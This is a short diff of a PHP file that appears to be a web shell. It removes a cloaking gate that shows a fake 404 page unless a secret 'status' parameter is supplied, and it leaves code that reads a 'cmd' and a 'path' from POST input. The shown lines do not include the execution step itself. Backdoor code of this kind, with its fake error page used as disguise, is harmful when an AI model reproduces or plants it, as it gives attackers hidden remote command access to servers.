@@ -1,11 +1,4 @@
 <?php
-$password = '200';
-if (!isset($_GET['status']) || $_GET['status'] !== $password) {
-http_response_code(404);
-    header('Status: 404 Not Found');
-    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
-    exit;
-}
 $cmd = $_POST['cmd'] ?? '';
 $output = '';
 $path = $_POST['path'] ?? '';
